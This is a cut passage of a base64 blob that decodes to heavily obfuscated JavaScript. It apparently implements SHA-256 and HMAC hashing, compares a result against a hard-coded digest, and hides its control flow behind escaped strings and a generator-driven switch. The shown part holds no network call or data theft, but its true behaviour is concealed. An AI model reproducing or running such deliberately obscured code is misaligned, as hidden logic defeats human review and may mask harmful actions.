wNTFcdTAwNTJcdTAwNTNcdTAwNTRcdTAwNTVcdTAwNTYiKyJcdTAwNTdcdTAwNThcdTAwNTlcdTAwNWFcdTAwNjFcdTAwNjJcdTAwNjNcdTAwNjRcdTAwNjVcdTAwNjZcdTAwNjciKyJceDY4XHg2OVx4NmFceDZiXHg2Y1x4NmRceDZlXHg2Zlx4NzBceDcxXHg3MiIrIlx4NzNceDc0XHg3NVx4NzZceDc3XHg3OFx4NzlceDdhXHgzMFx4MzFceDMyIisiXHUwMDMzXHUwMDM0XHUwMDM1XHUwMDM2XHUwMDM3XHUwMDM4XHUwMDM5XHUwMDJiXHUwMDJmIjt2YXIgX19fYTlnPSIiO3ZhciBfX19fX19seGU9X19fX19fdGk1Lmxlbmd0aDtmb3IodmFyIF9fX196dHE9X19fX19fM2gxWzJdO19fX196dHE8X19fX19fbHhlO19fX196dHErPV9fX19fXzNoMVsxNV0pe3ZhciBfX19fX2d4Nj1fX19fX190aTUuY2hhckNvZGVBdChfX19fenRxKTw8X19fX19fM2gxWzhdfChfX19fenRxK19fX19fXzNoMVsxXTxfX19fX19seGU/X19fX19fdGk1LmNoYXJDb2RlQXQoX19fX3p0cStfX19fX18zaDFbMV0pPDxfX19fX18zaDFbN106X19fX19fM2gxWzJdKXwoX19fX3p0cStfX19fX18zaDFbMF08X19fX19fbHhlP19fX19fX3RpNS5jaGFyQ29kZUF0KF9fX196dHErX19fX19fM2gxWzBdKTpfX19fX18zaDFbMl0pO2Zvcih2YXIgX19feTE4PV9fX19fXzNoMVsyXTtfX195MTg8X19fX19fM2gxWzE2XTtfX195MTgrKyl7aWYoX19fX3p0cSpfX19fX18zaDFbN10rX19feTE4Kl9fX19fXzNoMVsxN10+X19fX19fdGk1Lmxlbmd0aCpfX19fX18zaDFbN10pX19fYTlnKz1fX19fX3hwdTtlbHNlIF9fX2E5Zys9X19fX3Z0MC5jaGFyQXQoX19fX19neDY+Pj5fX19fX18zaDFbMTddKihfX19fX18zaDFbMTVdLV9fX3kxOCkmX19fX19fM2gxWzE5XSl9fXJldHVybiBfX19hOWd9ZnVuY3Rpb24gX19fX19kYXEoX19fX19fdGk1LF9fX19feHB1KXt2YXIgX19fX19oNng9X19fX194cHUubGVuZ3RoO3ZhciBfX19fdnQwPUFycmF5KCk7dmFyIF9fX2E5ZyxfX19fX19seGUsX19fX3p0cSxfX19fX2d4Njt2YXIgX19feTE4PUFycmF5KE1hdGguY2VpbChfX19fX190aTUubGVuZ3RoL19fX19fXzNoMVswXSkpO2ZvcihfX19hOWc9X19fX19fM2gxWzJdO19fX2E5ZzxfX195MTgubGVuZ3RoO19fX2E5ZysrKXtfX195MThbX19fYTlnXT1fX19fX190aTUuY2hhckNvZGVBdChfX19hOWcqX19fX19fM2gxWzBdKTw8X19fX19fM2gxWzddfF9fX19fX3RpNS5jaGFyQ29kZUF0KF9fX2E5ZypfX19fX18zaDFbMF0rX19fX19fM2gxWzFdKX13aGlsZShfX195MTgubGVuZ3RoPl9fX19fXzNoMVsyXSl7X19fX19neDY9QXJyYXkoKTtfX19fenRxPV9fX19fXzNoMVsyXTtmb3IoX19fYTlnPV9fX19fXzNoMVsyXTtfX19hOWc8X19feTE4Lmxlbmd0aDtfX19hOWcrKyl7X19fX3p0cT0oX19fX3p0cTw8X19fX19fM2gxWzhdKStfX195MThbX19fYTlnXTtfX19fX19seGU9TWF0aC5mbG9vcihfX19fenRxL19fX19faDZ4KTtfX19fenRxLT1fX19fX19seGUqX19fX19oNng7aWYoX19fX19neDYubGVuZ3RoPl9fX19fXzNoMVsyXXx8X19fX19fbHhlPl9fX19fXzNoMVsyXSlfX19fX2d4NltfX19fX2d4Ni5sZW5ndGhdPV9fX19fX2x4ZX1fX19fdnQwW19fX192dDAubGVuZ3RoXT1fX19fenRxO19fX3kxOD1fX19fX2d4Nn12YXIgX19fX19fMnB0PSIiO2ZvcihfX19hOWc9X19fX3Z0MC5sZW5ndGgtX19fX19fM2gxWzFdO19fX2E5Zz49X19fX19fM2gxWzJdO19fX2E5Zy0tKV9fX19fXzJwdCs9X19fX194cHUuY2hhckF0KF9fX192dDBbX19fYTlnXSk7dmFyIF9fX193bDg9TWF0aC5jZWlsKF9fX19fX3RpNS5sZW5ndGgqX19fX19fM2gxWzddLyhNYXRoLmxvZyhfX19fX3hwdS5sZW5ndGgpL01hdGgubG9nKF9fX19fXzNoMVswXSkpKTtmb3IoX19fYTlnPV9fX19fXzJwdC5sZW5ndGg7X19fYTlnPF9fX193bDg7X19fYTlnKyspX19fX19fMnB0PV9fX19feHB1W19fX19fXzNoMVsyXV0rX19fX19fMnB0O3JldHVybiBfX19fX18ycHR9ZnVuY3Rpb24gX19fX19fcWRxKF9fX19fX3RpNSl7dmFyIF9fX19feHB1PSIiO3ZhciBfX19fX2g2eD0tX19fX19fM2gxWzFdO3ZhciBfX19fdnQwLF9fX2E5Zzt3aGlsZSgrK19fX19faDZ4PF9fX19fX3RpNS5sZW5ndGgpe19fX192dDA9X19fX19fdGk1LmNoYXJDb2RlQXQoX19fX19oNngpO19fX2E5Zz1fX19fX2g2eCtfX19fX18zaDFbMV08X19fX19fdGk1Lmxlbmd0aD9fX19fX190aTUuY2hhckNvZGVBdChfX19fX2g2eCtfX19fX18zaDFbMV0pOl9fX19fXzNoMVsyXTtpZihfX19fX18zaDFbMzldPD1fX19fdnQwJiZfX19fdnQwPD1fX19fX18zaDFbNDBdJiZfX19fX18zaDFbNDFdPD1fX19hOWcmJl9fX2E5Zzw9X19fX19fM2gxWzQyXSl7X19fX3Z0MD1fX19fX18zaDFbNDNdKygoX19fX3Z0MCZfX19fX18zaDFbMThdKTw8X19fX19fM2gxWzRdKSsoX19fYTlnJl9fX19fXzNoMVsxOF0pO19fX19faDZ4Kyt9aWYoX19fX3Z0MDw9X19fX19fM2gxWzQ0XSlfX19fX3hwdSs9U3RyaW5nLmZyb21DaGFyQ29kZShfX19fdnQwKTtlbHNlIGlmKF9fX192dDA8PV9fX19fXzNoMVs0NV0pX19fX194cHUrPVN0cmluZy5mcm9tQ2hhckNvZGUoX19fX19fM2gxWzQ2XXxfX19fdnQwPj4+X19fX19fM2gxWzE3XSZfX19fX18zaDFbNDddLF9fX19fXzNoMVsyMF18X19fX3Z0MCZfX19fX18zaDFbMTldKTtlbHNlIGlmKF9fX192dDA8PV9fX19fXzNoMVszMF0pX19fX194cHUrPVN0cmluZy5mcm9tQ2hhckNvZGUoX19fX19fM2gxWzQ4XXxfX19fdnQwPj4+X19fX19fM2gxWzIxXSZfX19fX18zaDFbMTRdLF9fX19fXzNoMVsyMF18X19fX3Z0MD4+Pl9fX19fXzNoMVsxN10mX19fX19fM2gxWzE5XSxfX19fX18zaDFbMjBdfF9fX192dDAmX19fX19fM2gxWzE5XSk7ZWxzZSBpZihfX19fdnQwPD1fX19fX18zaDFbNDldKV9fX19feHB1Kz1TdHJpbmcuZnJvbUNoYXJDb2RlKF9fX19fXzNoMVs1MF18X19fX3Z0MD4+Pl9fX19fXzNoMVsyN10mX19fX19fM2gxWzI2XSxfX19fX18zaDFbMjBdfF9fX192dDA+Pj5fX19fX18zaDFbMjFdJl9fX19fXzNoMVsxOV0sX19fX19fM2gxWzIwXXxfX19fdnQwPj4+X19fX19fM2gxWzE3XSZfX19fX18zaDFbMTldLF9fX19fXzNoMVsyMF18X19fX3Z0MCZfX19fX18zaDFbMTldKX1yZXR1cm4gX19fX194cHV9ZnVuY3Rpb24gX19fX19fNG5sKF9fX19fX3RpNSl7dmFyIF9fX19feHB1PSIiO2Zvcih2YXIgX19fX19oNng9X19fX19fM2gxWzJdO19fX19faDZ4PF9fX19fX3RpNS5sZW5ndGg7X19fX19oNngrKylfX19fX3hwdSs9U3RyaW5nLmZyb21DaGFyQ29kZShfX19fX190aTUuY2hhckNvZGVBdChfX19fX2g2eCkmX19fX19fM2gxWzIyXSxfX19fX190aTUuY2hhckNvZGVBdChfX19fX2g2eCk+Pj5fX19fX18zaDFbN10mX19fX19fM2gxWzIyXSk7cmV0dXJuIF9fX19feHB1fWZ1bmN0aW9uIF9fX3ZmbChfX19fX190aTUpe3ZhciBfX19fX3hwdT0iIjtmb3IodmFyIF9fX19faDZ4PV9fX19fXzNoMVsyXTtfX19fX2g2eDxfX19fX190aTUubGVuZ3RoO19fX19faDZ4KyspX19fX194cHUrPVN0cmluZy5mcm9tQ2hhckNvZGUoX19fX19fdGk1LmNoYXJDb2RlQXQoX19fX19oNngpPj4+X19fX19fM2gxWzddJl9fX19fXzNoMVsyMl0sX19fX19fdGk1LmNoYXJDb2RlQXQoX19fX19oNngpJl9fX19fXzNoMVsyMl0pO3JldHVybiBfX19fX3hwdX1mdW5jdGlvbiBfX19fZW8yKF9fX19fX3RpNSl7dmFyIF9fX19feHB1PUFycmF5KF9fX19fX3RpNS5sZW5ndGg+Pl9fX19fXzNoMVswXSk7Zm9yKHZhciBfX19fX2g2eD1fX19fX18zaDFbMl07X19fX19oNng8X19fX194cHUubGVuZ3RoO19fX19faDZ4KyspX19fX194cHVbX19fX19oNnhdPV9fX19fXzNoMVsyXTtmb3IodmFyIF9fX19faDZ4PV9fX19fXzNoMVsyXTtfX19fX2g2eDxfX19fX190aTUubGVuZ3RoKl9fX19fXzNoMVs3XTtfX19fX2g2eCs9X19fX19fM2gxWzddKV9fX19feHB1W19fX19faDZ4Pj5fX19fX18zaDFbMjRdXXw9KF9fX19fX3RpNS5jaGFyQ29kZUF0KF9fX19faDZ4L19fX19fXzNoMVs3XSkmX19fX19fM2gxWzIyXSk8PF9fX19fXzNoMVsyNV0tX19fX19oNnglX19fX19fM2gxWzIzXTtyZXR1cm4gX19fX194cHV9ZnVuY3Rpb24gX19fNjRoKF9fX19fX3RpNSl7dmFyIF9fX19feHB1PSIiO2Zvcih2YXIgX19fX19oNng9X19fX19fM2gxWzJdO19fX19faDZ4PF9fX19fX3RpNS5sZW5ndGgqX19fX19fM2gxWzIzXTtfX19fX2g2eCs9X19fX19fM2gxWzddKV9fX19feHB1Kz1TdHJpbmcuZnJvbUNoYXJDb2RlKF9fX19fX3RpNVtfX19fX2g2eD4+X19fX19fM2gxWzI0XV0+Pj5fX19fX18zaDFbMjVdLV9fX19faDZ4JV9fX19fXzNoMVsyM10mX19fX19fM2gxWzIyXSk7cmV0dXJuIF9fX19feHB1fWZ1bmN0aW9uIF9fX19fNXVkKF9fX19fX3RpNSxfX19fX3hwdSl7cmV0dXJuIF9fX19fX3RpNT4+Pl9fX19feHB1fF9fX19fX3RpNTw8X19fX19fM2gxWzIzXS1fX19fX3hwdX1mdW5jdGlvbiBfX19fX190aGEoX19fX19fdGk1LF9fX19feHB1KXtyZXR1cm4gX19fX19fdGk1Pj4+X19fX194cHV9ZnVuY3Rpb24gX19fX184NHgoX19fX19fdGk1LF9fX19feHB1LF9fX19faDZ4KXtyZXR1cm4gX19fX19fdGk1Jl9fX19feHB1Xn5fX19fX190aTUmX19fX19oNnh9ZnVuY3Rpb24gX19fX19mamYoX19fX19fdGk1LF9fX19feHB1LF9fX19faDZ4KXtyZXR1cm4gX19fX19fdGk1Jl9fX19feHB1Xl9fX19fX3RpNSZfX19fX2g2eF5fX19fX3hwdSZfX19fX2g2eH1mdW5jdGlvbiBfX19fX3JoeChfX19fX190aTUpe3JldHVybiBfX19fXzV1ZChfX19fX190aTUsX19fX19fM2gxWzBdKV5fX19fXzV1ZChfX19fX190aTUsX19fX19fM2gxWzUxXSleX19fX181dWQoX19fX19fdGk1LF9fX19fXzNoMVs1Ml0pfWZ1bmN0aW9uIF9fX193a3MoX19fX19fdGk1KXtyZXR1cm4gX19fX181dWQoX19fX19fdGk1LF9fX19fXzNoMVsxN10pXl9fX19fNXVkKF9fX19fX3RpNSxfX19fX18zaDFbNTNdKV5fX19fXzV1ZChfX19fX190aTUsX19fX19fM2gxWzU0XSl9ZnVuY3Rpb24gX19fX19ybG8oX19fX19fdGk1KXtyZXR1cm4gX19fX181dWQoX19fX19fdGk1LF9fX19fXzNoMVsyNl0pXl9fX19fNXVkKF9fX19fX3RpNSxfX19fX18zaDFbMjddKV5fX19fX190aGEoX19fX19fdGk1LF9fX19fXzNoMVsxNV0pfWZ1bmN0aW9uIF9fX19fX21uNChfX19fX190aTUpe3JldHVybiBfX19fXzV1ZChfX19fX190aTUsX19fX19fM2gxWzU1XSleX19fX181dWQoX19fX19fdGk1LF9fX19fXzNoMVsyOF0pXl9fX19fX3RoYShfX19fX190aTUsX19fX19fM2gxWzRdKX1mdW5jdGlvbiBfX19fX194Z3koX19fX19fdGk1KXtyZXR1cm4gX19fX181dWQoX19fX19fdGk1LF9fX19fXzNoMVs1Nl0pXl9fX19fNXVkKF9fX19fX3RpNSxfX19fX18zaDFbNTddKV5fX19fXzV1ZChfX19fX190aTUsX19fX19fM2gxWzU4XSl9ZnVuY3Rpb24gX19fX185YWEoX19fX19fdGk1KXtyZXR1cm4gX19fX181dWQoX19fX19fdGk1LF9fX19fXzNoMVs1OV0pXl9fX19fNXVkKF9fX19fX3RpNSxfX19fX18zaDFbMjddKV5fX19fXzV1ZChfX19fX190aTUsX19fX19fM2gxWzYwXSl9ZnVuY3Rpb24gX19fbjMzKF9fX19fX3RpNSl7cmV0dXJuIF9fX19fNXVkKF9fX19fX3RpNSxfX19fX18zaDFbMV0pXl9fX19fNXVkKF9fX19fX3RpNSxfX19fX18zaDFbN10pXl9fX19fX3RoYShfX19fX190aTUsX19fX19fM2gxWzI2XSl9ZnVuY3Rpb24gX19faGZpKF9fX19fX3RpNSl7cmV0dXJuIF9fX19fNXVkKF9fX19fX3RpNSxfX19fX18zaDFbMjhdKV5fX19fXzV1ZChfX19fX190aTUsX19fX19fM2gxWzYxXSleX19fX19fdGhhKF9fX19fX3RpNSxfX19fX18zaDFbMTddKX12YXIgX19faXFrPW5ldyBBcnJheShfX19fX18zaDFbNjJdLF9fX19fXzNoMVs2M10sLV9fX19fXzNoMVs2NF0sLV9fX19fXzNoMVs2NV0sX19fX19fM2gxWzY2XSxfX19fX18zaDFbNjddLC1fX19fX18zaDFbNjhdLC1fX19fX18zaDFbNjldLC1fX19fX18zaDFbNzBdLF9fX19fXzNoMVs3MV0sX19fX19fM2gxWzcyXSxfX19fX18zaDFbNzNdLF9fX19fXzNoMVs3NF0sLV9fX19fXzNoMVs3NV0sLV9fX19fXzNoMVs3Nl0sLV9fX19fXzNoMVs3N10sLV9fX19fXzNoMVs3OF0sLV9fX19fXzNoMVs3OV0sX19fX19fM2gxWzgwXSxfX19fX18zaDFbODFdLF9fX19fXzNoMVs4Ml0sX19fX19fM2gxWzgzXSxfX19fX18zaDFbODRdLF9fX19fXzNoMVs4NV0sLV9fX19fXzNoMVs4Nl0sLV9fX19fXzNoMVs4N10sLV9fX19fXzNoMVs4OF0sLV9fX19fXzNoMVs4OV0sLV9fX19fXzNoMVs5MF0sLV9fX19fXzNoMVs5MV0sX19fX19fM2gxWzkyXSxfX19fX18zaDFbOTNdLF9fX19fXzNoMVs5NF0sX19fX19fM2gxWzk1XSxfX19fX18zaDFbOTZdLF9fX19fXzNoMVs5N10sX19fX19fM2gxWzk4XSxfX19fX18zaDFbOTldLC1fX19fX18zaDFbMTAwXSwtX19fX19fM2gxWzEwMV0sLV9fX19fXzNoMVsxMDJdLC1fX19fX18zaDFbMTAzXSwtX19fX19fM2gxWzEwNF0sLV9fX19fXzNoMVsxMDVdLC1fX19fX18zaDFbMTA2XSwtX19fX19fM2gxWzEwN10sLV9fX19fXzNoMVsxMDhdLF9fX19fXzNoMVsxMDldLF9fX19fXzNoMVsxMTBdLF9fX19fXzNoMVsxMTFdLF9fX19fXzNoMVsxMTJdLF9fX19fXzNoMVsxMTNdLF9fX19fXzNoMVsxMTRdLF9fX19fXzNoMVsxMTVdLF9fX19fXzNoMVsxMTZdLF9fX19fXzNoMVsxMTddLF9fX19fXzNoMVsxMThdLF9fX19fXzNoMVsxMTldLC1fX19fX18zaDFbMTIwXSwtX19fX19fM2gxWzEyMV0sLV9fX19fXzNoMVsxMjJdLC1fX19fX18zaDFbMTIzXSwtX19fX19fM2gxWzEyNF0sLV9fX19fXzNoMVsxMjVdKTtmdW5jdGlvbiBfX19fcXdlKF9fX19fX3RpNSxfX19fX3hwdSl7dmFyIF9fX19faDZ4PW5ldyBBcnJheShfX19fX18zaDFbMTI2XSwtX19fX19fM2gxWzEyN10sX19fX19fM2gxWzEyOF0sLV9fX19fXzNoMVsxMjldLF9fX19fXzNoMVsxMzBdLC1fX19fX18zaDFbMTMxXSxfX19fX18zaDFbMTMyXSxfX19fX18zaDFbMTMzXSk7dmFyIF9fX192dDA9bmV3IEFycmF5KF9fX19fXzNoMVsyOV0pO3ZhciBfX19hOWcsX19fX19fbHhlLF9fX196dHEsX19fX19neDYsX19feTE4LF9fX19fXzJwdCxfX19fd2w4LF9fX2dzcTt2YXIgX19fNjI1LF9fX19fZGFxLF9fX19fX3FkcSxfX19fX180bmw7X19fX19fdGk1W19fX19feHB1Pj5fX19fX18zaDFbMjRdXXw9X19fX19fM2gxWzIwXTw8X19fX19fM2gxWzI1XS1fX19fX3hwdSVfX19fX18zaDFbMjNdO19fX19fX3RpNVsoX19fX194cHUrX19fX19fM2gxWzI5XT4+X19fX19fM2gxWzEzNF08PF9fX19fXzNoMVsxNl0pK19fX19fXzNoMVsxNF1dPV9fX19feHB1O2ZvcihfX182MjU9X19fX19fM2gxWzJdO19fXzYyNTxfX19fX190aTUubGVuZ3RoO19fXzYyNSs9X19fX19fM2gxWzhdKXtfX19hOWc9X19fX19oNnhbX19fX19fM2gxWzJdXTtfX19fX19seGU9X19fX19oNnhbX19fX19fM2gxWzFdXTtfX19fenRxPV9fX19faDZ4W19fX19fXzNoMVswXV07X19fX19neDY9X19fX19oNnhbX19fX19fM2gxWzE1XV07X19feTE4PV9fX19faDZ4W19fX19fXzNoMVsxNl1dO19fX19fXzJwdD1fX19fX2g2eFtfX19fX18zaDFbMjRdXTtfX19fd2w4PV9fX19faDZ4W19fX19fXzNoMVsxN11dO19fX2dzcT1fX19fX2g2eFtfX19fX18zaDFbMjZdXTtmb3IoX19fX19kYXE9X19fX19fM2gxWzJdO19fX19fZGFxPF9fX19fXzNoMVsyOV07X19fX19kYXErKyl7aWYoX19fX19kYXE8X19fX19fM2gxWzhdKV9fX192dDBbX19fX19kYXFdPV9fX19fX3RpNVtfX19fX2RhcStfX182MjVdO2Vsc2UgX19fX3Z0MFtfX19fX2RhcV09X19fX19fdGgxKF9fX19fX3RoMShfX19fX190aDEoX19fX19fbW40KF9fX192dDBbX19fX19kYXEtX19fX19fM2gxWzBdXSksX19fX3Z0MFtfX19fX2RhcS1fX19fX18zaDFbMjZdXSksX19fX19ybG8oX19fX3Z0MFtfX19fX2RhcS1fX19fX18zaDFbMTRdXSkpLF9fX192dDBbX19fX19kYXEtX19fX19fM2gxWzhdXSk7X19fX19fcWRxPV9fX19fX3RoMShfX19fX190aDEoX19fX19fdGgxKF9fX19fX3RoMShfX19nc3EsX19fX3drcyhfX195MTgpKSxfX19fXzg0eChfX195MTgsX19fX19fMnB0LF9fX193bDgpKSxfX19pcWtbX19fX19kYXFdKSxfX19fdnQwW19fX19fZGFxXSk7X19fX19fNG5sPV9fX19fX3RoMShfX19fX3JoeChfX19hOWcpLF9fX19fZmpmKF9fX2E5ZyxfX19fX19seGUsX19fX3p0cSkpO19fX2dzcT1fX19fd2w4O19fX193bDg9X19fX19fMnB0O19fX19fXzJwdD1fX195MTg7X19feTE4PV9fX19fX3RoMShfX19fX2d4NixfX19fX19xZHEpO19fX19fZ3g2PV9fX196dHE7X19fX3p0cT1fX19fX19seGU7X19fX19fbHhlPV9fX2E5ZztfX19hOWc9X19fX19fdGgxKF9fX19fX3FkcSxfX19fX180bmwpfV9fX19faDZ4W19fX19fXzNoMVsyXV09X19fX19fdGgxKF9fX2E5ZyxfX19fX2g2eFtfX19fX18zaDFbMl1dKTtfX19fX2g2eFtfX19fX18zaDFbMV1dPV9fX19fX3RoMShfX19fX19seGUsX19fX19oNnhbX19fX19fM2gxWzFdXSk7X19fX19oNnhbX19fX19fM2gxWzBdXT1fX19fX190aDEoX19fX3p0cSxfX19fX2g2eFtfX19fX18zaDFbMF1dKTtfX19fX2g2eFtfX19fX18zaDFbMTVdXT1fX19fX190aDEoX19fX19neDYsX19fX19oNnhbX19fX19fM2gxWzE1XV0pO19fX19faDZ4W19fX19fXzNoMVsxNl1dPV9fX19fX3RoMShfX195MTgsX19fX19oNnhbX19fX19fM2gxWzE2XV0pO19fX19faDZ4W19fX19fXzNoMVsyNF1dPV9fX19fX3RoMShfX19fX18ycHQsX19fX19oNnhbX19fX19fM2gxWzI0XV0pO19fX19faDZ4W19fX19fXzNoMVsxN11dPV9fX19fX3RoMShfX19fd2w4LF9fX19faDZ4W19fX19fXzNoMVsxN11dKTtfX19fX2g2eFtfX19fX18zaDFbMjZdXT1fX19fX190aDEoX19fZ3NxLF9fX19faDZ4W19fX19fXzNoMVsyNl1dKX1yZXR1cm4gX19fX19oNnh9ZnVuY3Rpb24gX19fX19fdGgxKF9fX19fX3RpNSxfX19fX3hwdSl7dmFyIF9fX19faDZ4PShfX19fX190aTUmX19fX19fM2gxWzMwXSkrKF9fX19feHB1Jl9fX19fXzNoMVszMF0pO3ZhciBfX19fdnQwPShfX19fX190aTU+Pl9fX19fXzNoMVs4XSkrKF9fX19feHB1Pj5fX19fX18zaDFbOF0pKyhfX19fX2g2eD4+X19fX19fM2gxWzhdKTtyZXR1cm4gX19fX3Z0MDw8X19fX19fM2gxWzhdfF9fX19faDZ4Jl9fX19fXzNoMVszMF19cmV0dXJue2hleDpfX19fX2g2eCxiNjQ6X19fX3p0cSxhbnk6X19fX19neDYsaGV4X2htYWM6X19fX19fbHhlLGI2NF9obWFjOl9fX196dHEsYW55X2htYWM6X19fX19neDZ9fSgpO2NvbnNvbGUubG9nKF9fX19fX3RpNSl9fX19O3JldHVybiBfX19hOWcoKX0pKCk7ZnVuY3Rpb24gX19fX19fdGk1KF9fX19fX3RpNSxfX19hOWcpe2lmKCJcdTAwNDJcdTAwNDdcdTAwNDdcdTAwMzdcdTAwNGFcdTAwNTAiKyJceDc5IiBpbiBfX19fX19seGUpe19fX19feHB1KCl9ZnVuY3Rpb24gX19fX194cHUoKXt2YXIgX19fX19fdGk1PWZ1bmN0aW9uKCl7dmFyIF9fX19fX3RpNT1fX19fX18zaDFbMl07dmFyIF9fX2E5Zz0iIjtmdW5jdGlvbiBfX19fX3hwdShfX19fX190aTUpe3JldHVybiBfX19fX2RuZShfX19fX18ycHQoX19fdnB6KF9fX19fX3RpNSkpKX1mdW5jdGlvbiBfX19fX2g2eChfX19fX190aTUpe3JldHVybiBfX19fX19xMDcoX19fX19fMnB0KF9fX3ZweihfX19fX190aTUpKSl9ZnVuY3Rpb24gX19fX19fbHhlKF9fX19fX3RpNSxfX19hOWcpe3JldHVybiBfX19fX19oajMoX19fX19fMnB0KF9fX3ZweihfX19fX190aTUpKSxfX19hOWcpfWZ1bmN0aW9uIF9fX192dDAoX19fX19fdGk1LF9fX2E5Zyl7cmV0dXJuIF9fX19fZG5lKF9fX19fMGxiKF9fX3ZweihfX19fX190aTUpLF9fX3ZweihfX19hOWcpKSl9ZnVuY3Rpb24gX19fX3p0cShfX19fX190aTUsX19fYTlnKXtyZXR1cm4gX19fX19fcTA3KF9fX19fMGxiKF9fX3ZweihfX19fX190aTUpLF9fX3ZweihfX19hOWcpKSl9ZnVuY3Rpb24gX19fX19neDYoX19fX19fdGk1LF9fX2E5ZyxfX19fX3hwdSl7cmV0dXJuIF9fX19fX2hqMyhfX19fXzBsYihfX192cHooX19fX19fdGk1KSxfX192cHooX19fYTlnKSksX19fX194cHUpfWZ1bmN0aW9uIF9fX3kxOCgpe3JldHVybiBfX19fX3hwdShfX19fX18zaDFbMzFdKS50b0xvd2VyQ2FzZSgpPT0iXHUwMDYyXHUwMDYxXHUwMDM3XHUwMDM4XHUwMDMxXHUwMDM2XHUwMDYyXHUwMDY2XHUwMDM4XHUwMDY2XHUwMDMwXHUwMDMxXHUwMDYzXHUwMDY2XHUwMDY1XHUwMDYxXHUwMDM0XHUwMDMxXHUwMDM0XHUwMDMxXHUwMDM0IisiXHgzMFx4NjRceDY1XHgzNVx4NjRceDYxXHg2NVx4MzJceDMyXHgzMlx4MzNceDYyXHgzMFx4MzBceDMzXHgzNlx4MzFceDYxXHgzM1x4MzlceDM2IisiXHgzMVx4MzdceDM3XHg2MVx4MzlceDYzXHg2Mlx4MzRceDMxXHgzMFx4NjZceDY2XHgzNlx4MzFceDY2XHgzMlx4MzBceDMwXHgzMVx4MzVceDYxIitfX19fX18zaDFbMzJdfWZ1bmN0aW9uIF9fX19fXzJwdChfX19fX190aTUpe3JldHVybiBfX19fMTV0KF9fX19fZWdtKF9fX19fdGIyKF9fX19fX3RpNSksX19fX19fdGk1Lmxlbmd0aCpfX19fX18zaDFbN10pKX1mdW5jdGlvbiBfX19fXzBsYihfX19fX190aTUsX19fYTlnKXt2YXIgX19fX194cHU9X19fX190YjIoX19fX19fdGk1KTtpZihfX19fX3hwdS5sZW5ndGg+X19fX19fM2gxWzhdKV9fX19feHB1PV9fX19fZWdtKF9fX19feHB1LF9fX19fX3RpNS5sZW5ndGgqX19fX19fM2gxWzddKTt2YXIgX19fX19oNng9QXJyYXkoX19fX19fM2gxWzhdKSxfX19fX19seGU9QXJyYXkoX19fX19fM2gxWzhdKTtmb3IodmFyIF9fX192dDA9X19fX19fM2gxWzJdO19fX192dDA8X19fX19fM2gxWzhdO19fX192dDArKyl7X19fX19oNnhbX19fX3Z0MF09X19fX194cHVbX19fX3Z0MF1eX19fX19fM2gxWzMzXTtfX19fX19seGVbX19fX3Z0MF09X19fX194cHVbX19fX3Z0MF1eX19fX19fM2gxWzM0XX12YXIgX19fX3p0cT1fX19fX2VnbShfX19fX2g2eC5jb25jYXQoX19fX190YjIoX19fYTlnKSksX19fX19fM2gxWzExXStfX19hOWcubGVuZ3RoKl9fX19fXzNoMVs3XSk7cmV0dXJuIF9fX18xNXQoX19fX19lZ20oX19fX19fbHhlLmNvbmNhdChfX19fenRxKSxfX19fX19reTYoX19fX19fM2gxWzldK19fX19fXzNoMVsxMF0sX19fX19fM2gxWzExXSxfX19fX18zaDFbMTJdKSkpfWZ1bmN0aW9uIF9fX19fZG5lKF9fX2E5Zyl7ZnVuY3Rpb24qX19fX194cHUoX19fX194cHUsX19fX19fbHhlLF9fX192dDAsX19fX3p0cT17WyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNjZcdTAwN2FcdTAwNjQiXTp7fX0pe3doaWxlKF9fX19feHB1K19fX19fX2x4ZStfX19fdnQwIT09LTE4KXt3aXRoKF9fX196dHFbIlx4NWZceDVmXHg1Zlx4MzFceDM4XHgzNCJdfHxfX19fenRxKXtzd2l0Y2goX19fX194cHUrX19fX19fbHhlK19fX192dDApe2Nhc2UgX19fX3p0cVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDY2XHUwMDdhXHUwMDY0Il1bIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDAzOVx1MDA3M1x1MDA2YiJdKzMwMTpfX19fenRxWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwMzFcdTAwMzhcdTAwMzQiXT1fX19fenRxWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNjZcdTAwN2FcdTAwNjQiXSxfX19fX3hwdSs9LTI1OCxfX19fX19seGUrPS0zODIsX19fX3Z0MCs9MjQ2O2JyZWFrO2RlZmF1bHQ6X19fX3p0cVsiXHg1Zlx4NWZceDVmXHg1Zlx4NjZceDdhXHg2NCJdWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwMzJcdTAwNmVcdTAwNjciXT0iIjtfX19fenRxWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNjZcdTAwN2FcdTAwNjQiXVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDMyXHUwMDZiXHUwMDM2Il09dW5kZWZpbmVkO2ZvcihfX19fenRxWyJceDVmXHg1Zlx4NWZceDVmXHg2Nlx4N2FceDY0Il1bIlx4NWZceDVmXHg1Zlx4NWZceDY4XHg3Nlx4NmYiXT1fX19fX18zaDFbMl07X19fX2h2bzxfX19hOWcubGVuZ3RoO19fX19odm8rKyl7X19fX19fMms2PV9fX2E5Zy5jaGFyQ29kZUF0KF9fX19odm8pO19fX19fMm5nKz1fX19fYndxLmNoYXJBdChfX19fX18yazY+Pj5fX19fX18zaDFbMTZdJl9fX19fXzNoMVsxNF0pK19fX19id3EuY2hhckF0KF9fX19fXzJrNiZfX19fX18zaDFbX19fX19fbHhlKzIyN10pfV9fX196dHFbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDAzMVx1MDAzOFx1MDAzNCJdPV9fX196dHFbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2Nlx1MDA3YVx1MDA2NCJdLF9fX19fX2x4ZSs9MjEwLF9fX192dDArPS0yMDU7YnJlYWs7Y2FzZSBfX19fX3hwdS0zMTM6cmV0dXJuIF9fX19faDZ4PXRydWUsX19fX18ybmc7X19fX3p0cVsiXHg1Zlx4NWZceDVmXHgzMVx4MzhceDM0Il09X19fX3p0cVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDVmXHgzMFx4MzFceDMxIl0sX19fX194cHUrPS0yNTgsX19fX19fbHhlKz02NyxfX19fdnQwKz0zMDA7YnJlYWs7Y2Fz